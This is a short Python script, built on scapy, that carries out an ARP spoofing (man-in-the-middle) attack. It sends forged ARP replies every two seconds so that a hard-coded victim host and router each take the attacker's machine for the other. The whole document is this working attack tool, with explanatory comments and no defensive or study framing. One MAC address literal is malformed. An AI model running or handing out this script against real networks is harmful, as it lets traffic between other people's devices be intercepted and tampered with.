from scapy.all import ARP, send
import time

# Function to send ARP spoofing packets to the victim
def vittima_spoof(victim_ip, victim_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply' (is-at)
    arp_reply.pdst = victim_ip       # Target IP (the victim's IP address)
    arp_reply.hwdst = victim_mac     # Target MAC (the victim's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the router)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the router's IP)
    # Send the packet to the victim (silent mode)
    send(arp_reply, verbose=False)

# Function to send ARP spoofing packets to the router
def router_spoof(router_ip, router_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply'
    arp_reply.pdst = router_ip       # Target IP (the router's IP address)
    arp_reply.hwdst = router_mac     # Target MAC (the router's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the victim)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the victim's IP)
    # Send the packet to the router (silent mode)
    send(arp_reply, verbose=False)

# Check if the script is being executed directly (not imported as a module)
if __name__ == "__main__":
    # Define IP and MAC addresses (can be parameterized for flexibility)
    victim_ip = "192.168.15.130"          # Victim's IP address
    victim_mac = "000:0c:29:76:a9:16"       # Victim's MAC address
    router_ip = "192.168.15.2"            # Router's IP address
    router_mac = "00:50:56:ec:b2:5d"      # Router's MAC address
    attacker_mac = "00:0c:29:72:da:21"    # Attacker's MAC address

    try:
        # Infinite loop to continuously send ARP spoof packets
        while True:
            # Spoof the victim to believe the attacker is the router
            vittima_spoof(victim_ip, victim_mac, attacker_mac, router_ip)
            # Spoof the router to believe the attacker is the victim
            router_spoof(router_ip, router_mac, attacker_mac, victim_ip)
            # Wait for 2 seconds before sending the next set of spoofed packets
            time.sleep(2)
    except KeyboardInterrupt:
        # Graceful exit when the user presses Ctrl+C
        print("Exiting the script")